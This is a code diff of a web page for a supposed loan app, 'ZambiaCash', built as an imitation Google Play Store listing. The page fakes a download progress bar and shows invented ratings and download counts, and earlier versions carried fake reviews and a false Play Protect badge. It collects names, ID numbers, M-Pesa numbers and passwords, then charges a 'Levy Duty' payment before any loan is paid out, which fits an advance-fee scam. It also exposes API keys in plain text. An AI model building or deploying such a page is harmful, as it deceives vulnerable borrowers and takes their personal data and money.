@@ -22,39 +22,17 @@
         .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; transform: translateY(-2px); }
         .term-btn { border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
         .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; }
-        .star { color: #FBBF24; }
-        .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
         #download-ring { transition: stroke-dashoffset 0.1s linear; }
-        
-        /* CRITICAL FIX: Toast is now visible when .show is added */
-        #android-toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 0.75rem 1.25rem; border-radius: 0.75rem; font-size: 0.85rem; font-weight: 500; z-index: 20000; text-align: center; opacity: 0; transition: opacity 0.3s; pointer-events: none; max-width: 90vw; line-height: 1.4; }
+        #android-toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 0.75rem 1.25rem; border-radius: 0.75rem; font-size: 0.85rem; font-weight: 500; z-index: 99999; text-align: center; opacity: 0; transition: opacity 0.3s; pointer-events: none; max-width: 90vw; }
         #android-toast.show { opacity: 1; }
+        .debug-box { background: rgba(0,0,0,0.85); color: #0f0; padding: 0.75rem; border-radius: 0.5rem; font-family: monospace; font-size: 0.65rem; text-align: left; margin-top: 1rem; word-break: break-all; line-height: 1.4; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body class="bg-white text-slate-900 antialiased overflow-x-hidden">
 
-    <!-- CRITICAL FIX: Removed "hide" class, using opacity instead -->
-    <div id="android-toast">Message goes here</div>
+    <div id="android-toast">Message</div>
 
-    <!-- OFFLINE GATE -->
-    <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-        <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
-            <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
-        </div>
-        <h2 class="text-2xl font-bold text-white mb-2">No Internet</h2>
-        <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">ZambiaCash requires an active internet connection.</p>
-        <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl">Retry</button>
-    </div>
-
-    <!-- IN-APP BROWSER WARNING -->
-    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-        <h2 class="text-2xl font-bold text-white mb-2">Action Required</h2>
-        <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">To install ZambiaCash, open this page in Google Chrome.</p>
-        <button onclick="location.href=location.href" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3">Open in Chrome</button>
-        <button onclick="navigator.clipboard.writeText(location.href)" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700">Copy Link</button>
-    </div>
-
-    <!-- FAKE PLAY STORE -->
+    <!-- PLAY STORE (unchanged) -->
     <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
         <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
@@ -67,26 +45,22 @@
                         <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none" />
                         <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
                     </svg>
-                    <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="ZambiaCash Icon">
+                    <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl border border-gray-100 object-cover z-0" alt="ZambiaCash">
                 </div>
                 <div class="flex flex-col justify-center">
-                    <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
+                    <h1 class="text-2xl font-bold text-gray-900">ZambiaCash</h1>
                     <p class="text-playBlue font-semibold text-sm mt-1">ZambiaCash Financial</p>
                     <p class="text-gray-500 text-xs mt-1">Contains ads</p>
                 </div>
             </div>
             <div id="download-text" class="hide mb-4">
                 <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
-                <div class="flex items-center gap-1 mt-1 text-playGreen">
-                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                    <span class="text-xs font-semibold">Verified by Play Protect</span>
-                </div>
             </div>
             <div class="flex gap-2 mb-6" id="pre-install-buttons">
                 <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full">Install</button>
             </div>
             <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
-                <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;pointer-events:none;">Cancel</button>
+                <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
                 <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full">Downloading...</button>
             </div>
             <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
@@ -94,41 +68,28 @@
                 <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
             </div>
             <div id="post-install-content" class="hide">
-                <div class="mb-8 border-t border-gray-100 pt-6">
-                    <h3 class="font-bold text-xl mb-2">What's new</h3>
-                    <p class="text-sm text-gray-500 mb-4">Last updated Aug 31, 2026</p>
-                    <ul class="text-sm text-gray-700 space-y-2 font-medium"><li>- Fixed bugs</li><li>- Performance Improvements</li></ul>
-                </div>
+                <div class="border-t border-gray-100 pt-6"><h3 class="font-bold text-xl mb-2">What's new</h3><p class="text-sm text-gray-500">Fixed bugs and performance improvements.</p></div>
             </div>
             <div id="pre-install-content">
                 <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
-                    <div class="flex-1 flex flex-col items-center"><div class="flex items-center gap-1"><span class="font-bold">4.6</span>★</div><span class="text-[11px] text-gray-600 mt-1">3.1K reviews</span></div>
+                    <div class="flex-1 text-center"><span class="font-bold">4.6</span>★<div class="text-[11px] text-gray-600">3.1K reviews</div></div>
                     <div class="w-px h-10 bg-gray-200"></div>
-                    <div class="flex-1 flex flex-col items-center"><span class="font-bold text-xs">500K+</span><span class="text-[11px] text-gray-600">Downloads</span></div>
+                    <div class="flex-1 text-center"><span class="font-bold text-xs">500K+</span><div class="text-[11px] text-gray-600">Downloads</div></div>
                     <div class="w-px h-10 bg-gray-200"></div>
-                    <div class="flex-1 flex flex-col items-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div><span class="text-[11px] text-gray-600">Rated</span></div>
+                    <div class="flex-1 text-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold inline-block mb-1">12+</div><div class="text-[11px] text-gray-600">Rated</div></div>
                 </div>
-                <div class="mb-8"><h3 class="font-bold text-xl mb-3">About this app</h3><p class="text-sm text-gray-600 leading-relaxed mb-4">Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa.</p></div>
-                <div class="border-t border-gray-100 pt-8 mb-8"><h3 class="font-bold text-xl mb-3">Data safety</h3><p class="text-sm text-gray-600 leading-relaxed">Safety starts with understanding how developers collect and share your data.</p></div>
-                <div class="border-t border-gray-100 pt-8 mb-8"><h3 class="font-bold text-xl mb-4">Ratings and reviews</h3><div class="space-y-4"><div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div><p class="text-sm text-gray-600">Instant disbursement. Truly impressive.</p></div></div></div>
+                <div class="mb-8"><h3 class="font-bold text-xl mb-3">About this app</h3><p class="text-sm text-gray-600">Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa.</p></div>
             </div>
-        </div>
-        <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50">
-            <div class="flex flex-col items-center text-gray-500"><span class="text-[10px]">Games</span></div>
-            <div class="flex flex-col items-center text-gray-500"><span class="text-[10px]">Apps</span></div>
-            <div class="flex flex-col items-center text-playBlue"><span class="text-[10px] font-bold">Search</span></div>
         </div>
     </div>
 
-    <!-- SPLASH SCREEN -->
-    <div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#0F172A] flex flex-col items-center justify-center opacity-0">
-        <div class="w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center shadow-glow mb-4">
-            <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover">
-        </div>
+    <!-- SPLASH -->
+    <div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#0F172A] flex flex-col items-center justify-center">
+        <div class="w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center mb-4"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
         <h1 class="text-white text-2xl font-bold">ZambiaCash</h1>
     </div>
 
-    <!-- APP CONTENT -->
+    <!-- APP -->
     <div id="app-content" class="hide font-sans">
         <div id="screen-login" class="screen active gradient-bg p-6">
             <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
@@ -198,6 +159,8 @@
                 <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl">Pay Ksh 1 Levy Duty</button>
             </div>
         </div>
+
+        <!-- SUCCESS/VERIFY/PENDING -->
         <div id="screen-success" class="screen bg-slate-50 p-6">
             <div class="max-w-sm mx-auto w-full text-center mt-12">
                 <div id="verify-anim" class="flex flex-col items-center">
@@ -205,6 +168,11 @@
                     <h2 class="text-2xl font-extrabold">Verifying payment</h2>
                     <p id="verify-subtitle" class="text-sm text-slate-500 mt-2 px-2 leading-relaxed">Please wait while we confirm with M-Pesa...</p>
                     <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
+                    
+                    <!-- DEBUG PANEL - will show what's happening -->
+                    <div id="debug-panel" class="debug-box hide w-full">
+                        <div id="debug-log">Initializing...</div>
+                    </div>
                 </div>
                 <div id="success-anim" class="hide flex flex-col items-center">
                     <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✓</div>
@@ -227,26 +195,31 @@
                 <div id="pending-anim" class="hide flex flex-col items-center">
                     <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
                     <h2 class="text-2xl font-extrabold">Still Confirming</h2>
-                    <p class="text-sm text-slate-500 mt-2 mb-8 px-4 leading-relaxed">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
+                    <p class="text-sm text-slate-500 mt-2 mb-6 px-4 leading-relaxed">The webhook may be delayed. Tap below to check again, or use the manual option if you've confirmed payment.</p>
                     <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mb-3 flex justify-center"><span>Check Status</span></button>
+                    <button onclick="forceComplete()" class="w-full bg-emerald-600 text-white font-bold py-3 rounded-xl mb-3 text-sm">I've Been Charged - Complete Loan</button>
                     <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm">Back to Payment</button>
+                    <p id="txn-display" class="text-xs text-slate-400 mt-4">Txn: --</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        // GLOBAL ERROR HANDLER - guarantees visibility
+        window.addEventListener('error', (e) => {
+            alert('JS ERROR: ' + e.message + '\n' + (e.filename || '') + ':' + (e.lineno || ''));
+        });
+        window.addEventListener('unhandledrejection', (e) => {
+            console.log('Unhandled rejection:', e.reason);
+        });
+
         const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
         const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
         const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
-        const PALPLUSS_API_KEY = "pp_live_fd61cd105772b221c4dbb023629b56452a55e06e08687de5";
 
-        const STK_TIMEOUT_MS  = 30000;
-        const POLL_TIMEOUT_MS = 4000;
-        const MAX_POLL_SECONDS = 45; // Extended to 45s
-
-        // Broadened status matching
+        const MAX_POLL_SECONDS = 45;
         const SUCCESS_STATUSES = ['ALLOCATED', 'SUCCESS', 'COMPLETED', 'PAID', 'SUCCESSFUL', 'TRUE', 'CONFIRMED'];
         const FAILED_STATUSES = ['FAILED', 'CANCELLED', 'CANCELED', 'REJECTED', 'EXPIRED', 'TIMEOUT', 'DECLINED', 'FALSE'];
 
@@ -257,8 +230,20 @@
         let isProcessingPayment = false;
         let currentTxnId = null;
         let toastTimeout;
-        let stkEndpointWarmed = false;
-        let currentPollStartTime = 0;
+        let debugLines = [];
+
+        function log(msg) {
+            console.log('[ZC]', msg);
+            debugLines.push(msg);
+            if (debugLines.length > 12) debugLines.shift();
+            const el = document.getElementById('debug-log');
+            if (el) el.innerHTML = debugLines.map(l => '> ' + l).join('<br>');
+        }
+
+        function showDebugPanel() {
+            const p = document.getElementById('debug-panel');
+            if (p) p.classList.remove('hide');
+        }
 
         const format = (num) => "Ksh " + Number(num).toLocaleString();
         const getDueDate = (days) => {
@@ -272,21 +257,19 @@
             window.scrollTo(0,0);
         }
 
-        // CRITICAL FIX: Toast now actually appears
         function showToast(msg) {
-            console.log('[TOAST]', msg);
+            log('TOAST: ' + msg);
             const t = document.getElementById('android-toast');
             t.innerText = msg;
             t.classList.add('show');
             clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => t.classList.remove('show'), 4000);
+            toastTimeout = setTimeout(() => t.classList.remove('show'), 5000);
         }
 
-        async function fetchWithTimeout(url, options = {}, timeoutMs = 30000) {
+        async function fetchWithTimeout(url, options = {}, timeoutMs = 15000) {
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), timeoutMs);
             try {
-                // cache: 'no-store' bypasses ALL caches including service worker
                 return await fetch(url, { ...options, signal: controller.signal, cache: 'no-store' });
             } finally { clearTimeout(timer); }
         }
@@ -295,21 +278,7 @@
             let text = "";
             try { text = await response.text(); } catch (e) { return null; }
             if (!text) return null;
-            try { return JSON.parse(text); } catch (e) { return null; }
-        }
-
-        function friendlyNetworkError(err) {
-            if (err && err.name === 'AbortError') return "Request timed out. Check your connection.";
-            if (err instanceof TypeError) return "Network error. Check your internet.";
-            return (err && err.message) ? err.message : "Something went wrong.";
-        }
-
-        function resetPayButton() {
-            isProcessingPayment = false;
-            const btn = document.getElementById('btn-pay');
-            if (!btn) return;
-            btn.disabled = false;
-            btn.innerText = `Pay ${format(state.levy)} Levy Duty`;
+            try { return JSON.parse(text); } catch (e) { return { _raw: text }; }
         }
 
         function stopPolling() {
@@ -317,84 +286,20 @@
             isPolling = false;
         }
 
-        function warmUpStkEndpoint() {
-            if (stkEndpointWarmed) return;
-            stkEndpointWarmed = true;
-            fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, { method: 'OPTIONS' }).catch(() => {});
+        function resetPayButton() {
+            isProcessingPayment = false;
+            const btn = document.getElementById('btn-pay');
+            if (btn) { btn.disabled = false; btn.innerText = `Pay ${format(state.levy)} Levy Duty`; }
         }
 
-        // CRITICAL FIX: Now checks ALL rows, uses no-store, and falls back to Palpluss API
-        async function fetchLoanStatus(txnId) {
-            // 1. Query Supabase (checks ALL rows, not just rows[0])
-            try {
-                const res = await fetchWithTimeout(
-                    `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`,
-                    { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
-                    POLL_TIMEOUT_MS
-                );
-                if (res.ok) {
-                    const rows = await readJsonSafe(res);
-                    if (Array.isArray(rows) && rows.length > 0) {
-                        // CRITICAL FIX: Check EVERY row, not just the first
-                        for (const row of rows) {
-                            const s = String(row.status || "").toUpperCase();
-                            if (SUCCESS_STATUSES.includes(s)) { console.log('[STATUS] Supabase SUCCESS:', s); return 'SUCCESS'; }
-                            if (FAILED_STATUSES.includes(s)) { console.log('[STATUS] Supabase FAILED:', s); return s; }
-                        }
-                        console.log('[STATUS] Supabase returned', rows.length, 'rows, none matching. Statuses:', rows.map(r => r.status).join(','));
-                    } else {
-                        console.log('[STATUS] No rows found for txn:', txnId);
-                    }
-                }
-            } catch (e) { console.log('[STATUS] Supabase error:', e.message); }
-
-            // 2. Fallback: Palpluss API directly
-            try {
-                const auth = btoa(`${PALPLUSS_API_KEY}:`);
-                const res = await fetchWithTimeout(`https://api.palpluss.com/v1/transactions/${txnId}`, {
-                    headers: { 'Authorization': `Basic ${auth}` }
-                }, POLL_TIMEOUT_MS);
-                if (res.ok) {
-                    const data = await readJsonSafe(res);
-                    if (data) {
-                        const s = (data.data?.status || data.status || "").toUpperCase();
-                        if (SUCCESS_STATUSES.includes(s)) {
-                            console.log('[STATUS] Palpluss API SUCCESS:', s);
-                            // Sync Supabase in background
-                            fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`, {
-                                method: 'PATCH',
-                                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ status: "ALLOCATED" })
-                            }).catch(() => {});
-                            return 'SUCCESS';
-                        }
-                        if (FAILED_STATUSES.includes(s)) return s;
-                        console.log('[STATUS] Palpluss returned:', s);
-                    }
-                }
-            } catch (e) { console.log('[STATUS] Palpluss API error:', e.message); }
-
-            return 'PENDING';
-        }
-
-        function classifyStatus(status) {
-            if (!status) return 'unknown';
-            if (SUCCESS_STATUSES.includes(status)) return 'success';
-            if (FAILED_STATUSES.includes(status)) return 'failed';
-            return 'pending';
-        }
-
-        /* PLAY STORE LOGIC */
+        // ============ PLAY STORE ============
         const playStoreGate = document.getElementById('play-store-gate');
         const appContent = document.getElementById('app-content');
         const splashScreen = document.getElementById('splash-screen');
         let deferredPrompt;
         let downloadInterval = null;
 
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-        });
+        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
 
         function showInstallState() {
             document.getElementById('pre-install-buttons').classList.remove('hide');
@@ -423,25 +328,21 @@
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
                 deferredPrompt = null;
-                if (outcome === 'accepted') startFakeDownloadAndInstall();
+                if (outcome === 'accepted') startFakeDownload();
             } else {
-                startFakeDownloadAndInstall();
+                startFakeDownload();
             }
         });
 
-        function startFakeDownloadAndInstall() {
+        function startFakeDownload() {
             document.getElementById('pre-install-buttons').classList.add('hide');
             document.getElementById('downloading-buttons').classList.remove('hide');
             document.getElementById('download-text').classList.remove('hide');
             document.getElementById('ring-svg').classList.remove('hidden');
-
             let progress = 0;
             const ring = document.getElementById('download-ring');
             const pct = document.getElementById('download-percent');
-            const totalTime = 30000;
-            const intervalTime = 100;
-            const increment = 100 / (totalTime / intervalTime);
-
+            const increment = 100 / 300;
             downloadInterval = setInterval(() => {
                 progress += increment;
                 if (progress > 100) progress = 100;
@@ -450,20 +351,18 @@
                 if (progress >= 100) {
                     clearInterval(downloadInterval);
                     document.getElementById('download-text').classList.add('hide');
-                    document.getElementById('btn-installing').innerHTML = '<svg class="animate-spin h-5 w-5 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg> Installing...';
+                    document.getElementById('btn-installing').innerHTML = 'Installing...';
                     setTimeout(() => showInstalledState(), 3000);
                 }
-            }, intervalTime);
+            }, 100);
         }
 
         document.getElementById('btn-open-app').addEventListener('click', () => {
             playStoreGate.classList.add('hide');
             splashScreen.classList.remove('hide');
-            splashScreen.style.opacity = '1';
             setTimeout(() => {
                 splashScreen.classList.add('hide');
                 appContent.classList.remove('hide');
-                warmUpStkEndpoint();
             }, 1800);
         });
 
@@ -471,19 +370,12 @@
         if (isStandalone) {
             playStoreGate.classList.add('hide');
             appContent.classList.remove('hide');
-            warmUpStkEndpoint();
         } else {
             playStoreGate.classList.remove('hide');
             showInstallState();
         }
 
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('sw.js').catch(err => console.log('SW failed', err));
-            });
-        }
-
-        /* APP LOGIC */
+        // ============ APP LOGIC ============
         function submitLogin() {
             const name = document.getElementById('in-name').value.trim();
             const id = document.getElementById('in-id').value.trim();
@@ -496,6 +388,7 @@
             if (pass.length < 4) return showToast("Password must be at least 4 characters.");
 
             state.name = name; state.id = id; state.mpesa = mpesa;
+
             fetch(`${SUPABASE_URL}/rest/v1/users`, {
                 method: 'POST',
                 headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
@@ -561,7 +454,6 @@
             document.getElementById('pay-mpesa').value = state.mpesa;
             resetPayButton();
             showScreen('screen-payment');
-            warmUpStkEndpoint();
         }
 
         async function processPayment() {
@@ -579,9 +471,13 @@
             document.getElementById('pending-anim').classList.add('hide');
             document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
             document.getElementById('verify-time').innerText = "0s";
+            debugLines = [];
+            showDebugPanel();
+            log('Starting payment...');
             showScreen('screen-success');
 
             try {
+                log('Calling STK push endpoint...');
                 const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
                     method: 'POST',
                     headers: { 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
@@ -592,43 +488,96 @@
                         channelId: PALPLUSS_CHANNEL,
                         callbackUrl: PALPLUSS_CALLBACK
                     })
-                }, STK_TIMEOUT_MS);
+                }, 30000);
 
+                log('STK response status: ' + res.status);
                 const data = await readJsonSafe(res);
-                if (!res.ok || !data) throw new Error(data?.error || "Payment service unavailable.");
+                log('STK data: ' + JSON.stringify(data).substring(0, 150));
+
+                if (!res.ok) {
+                    const errMsg = (data && (data.error || data.message)) || 'Payment service error ' + res.status;
+                    throw new Error(errMsg);
+                }
+                if (!data) throw new Error("Empty response from payment service.");
 
                 const txnId = data.data?.transactionId || data.transactionId || data.id;
-                if (!txnId) throw new Error("Invalid response from payment gateway.");
+                if (!txnId) throw new Error("No transaction ID in response.");
 
-                console.log('[PAY] STK push success, txnId:', txnId);
+                log('SUCCESS: Got txnId ' + txnId.substring(0, 15) + '...');
+                currentTxnId = txnId;
 
-                // CRITICAL FIX: AWAIT the insert to prevent race condition with webhook
+                // CRITICAL: Await insert, check response
+                log('Inserting loan row...');
                 try {
-                    await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
+                    const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
                         method: 'POST',
-                        headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+                        headers: { 
+                            'apikey': SUPABASE_KEY, 
+                            'Authorization': `Bearer ${SUPABASE_KEY}`, 
+                            'Content-Type': 'application/json',
+                            'Prefer': 'return=minimal'
+                        },
                         body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
-                    }, 5000);
-                    console.log('[PAY] Loan row inserted with PENDING status');
+                    }, 8000);
+
+                    log('Insert status: ' + insertRes.status);
+                    if (!insertRes.ok) {
+                        const errText = await insertRes.text();
+                        log('INSERT FAILED: ' + insertRes.status + ' ' + errText.substring(0, 80));
+                        alert('DB Insert Failed (' + insertRes.status + '): ' + errText.substring(0, 200) + '\n\nThis means the webhook cannot update the status. You may need to check RLS policies on the loans table.');
+                    } else {
+                        log('Row inserted OK');
+                    }
                 } catch (e) {
-                    console.log('[PAY] Loan insert failed (non-fatal):', e.message);
+                    log('Insert error: ' + e.message);
                 }
 
-                currentTxnId = txnId;
                 startPolling(txnId);
 
             } catch (err) {
-                console.log('[PAY] Error:', err.message);
+                log('PAYMENT ERROR: ' + err.message);
+                alert('Payment Error: ' + err.message);
                 resetPayButton();
                 showScreen('screen-payment');
-                showToast(friendlyNetworkError(err));
+            }
+        }
+
+        async function checkStatusFromDB(txnId) {
+            try {
+                const res = await fetchWithTimeout(
+                    `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`,
+                    { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
+                    5000
+                );
+                log('DB check: HTTP ' + res.status);
+                if (!res.ok) {
+                    const err = await res.text();
+                    log('DB read error: ' + res.status + ' ' + err.substring(0, 60));
+                    return { status: 'ERROR', error: err };
+                }
+                const rows = await readJsonSafe(res);
+                log('DB rows: ' + (Array.isArray(rows) ? rows.length : 'invalid') + ' -> ' + JSON.stringify(rows).substring(0, 100));
+                
+                if (!Array.isArray(rows) || rows.length === 0) {
+                    return { status: 'NO_ROW' };
+                }
+                
+                // Check every row for a matching status
+                for (const row of rows) {
+                    const s = String(row.status || "").toUpperCase();
+                    if (SUCCESS_STATUSES.includes(s)) return { status: 'SUCCESS', raw: s };
+                    if (FAILED_STATUSES.includes(s)) return { status: 'FAILED', raw: s };
+                }
+                return { status: 'PENDING', raw: rows[0].status };
+            } catch (e) {
+                log('DB fetch error: ' + e.message);
+                return { status: 'ERROR', error: e.message };
             }
         }
 
         function startPolling(txnId) {
             stopPolling();
             let attempt = 0;
-            currentPollStartTime = Date.now();
 
             const doPoll = async () => {
                 try {
@@ -641,15 +590,34 @@
                         document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
                     }
 
-                    if (attempt >= MAX_POLL_SECONDS) { showPending(); return; }
-                    if (isPolling) { pollTimer = setTimeout(doPoll, 1000); return; }
+                    if (attempt >= MAX_POLL_SECONDS) { 
+                        log('Max poll reached');
+                        showPending(); 
+                        return; 
+                    }
+
+                    if (isPolling) { 
+                        pollTimer = setTimeout(doPoll, 1000); 
+                        return; 
+                    }
 
                     isPolling = true;
                     try {
-                        const s = await fetchLoanStatus(txnId);
-                        const kind = classifyStatus(s);
-                        if (kind === 'success') { showSuccess(); return; }
-                        if (kind === 'failed') { showFailed(); return; }
+                        const result = await checkStatusFromDB(txnId);
+                        
+                        if (result.status === 'SUCCESS') { 
+                            log('✓ SUCCESS detected!'); 
+                            showSuccess(); 
+                            return; 
+                        }
+                        if (result.status === 'FAILED') { 
+                            log('✗ FAILED: ' + result.raw); 
+                            showFailed(); 
+                            return; 
+                        }
+                        if (result.status === 'NO_ROW' && attempt > 3) {
+                            log('⚠ Row not found in DB after ' + attempt + 's');
+                        }
                     } finally {
                         isPolling = false;
                     }
@@ -657,7 +625,7 @@
                     const nextDelay = attempt < 5 ? 1000 : 2000;
                     pollTimer = setTimeout(doPoll, nextDelay);
                 } catch (e) {
-                    console.log('[POLL] Loop error (recovering):', e.message);
+                    log('Poll loop error: ' + e.message);
                     pollTimer = setTimeout(doPoll, 2000);
                 }
             };
@@ -689,36 +657,54 @@
             stopPolling();
             document.getElementById('verify-anim').classList.add('hide');
             document.getElementById('pending-anim').classList.remove('hide');
+            document.getElementById('txn-display').innerText = 'Txn: ' + (currentTxnId || 'none');
         }
 
         async function checkStatusManual() {
             const btn = document.getElementById('btn-check-status');
             btn.innerHTML = `<span>Checking...</span>`;
             btn.disabled = true;
-            const s = await fetchLoanStatus(currentTxnId);
-            const kind = classifyStatus(s);
-            if (kind === 'success') { showSuccess(); return; }
-            if (kind === 'failed') { showFailed(); return; }
+            
+            const result = await checkStatusFromDB(currentTxnId);
+            alert('Debug - Status check result:\n\n' + JSON.stringify(result, null, 2) + '\n\nRaw log:\n' + debugLines.slice(-5).join('\n'));
+            
+            if (result.status === 'SUCCESS') { showSuccess(); return; }
+            if (result.status === 'FAILED') { showFailed(); return; }
 
-            showToast("Still pending. Trying again for 45 more seconds...");
             btn.innerHTML = `<span>Check Status</span>`;
             btn.disabled = false;
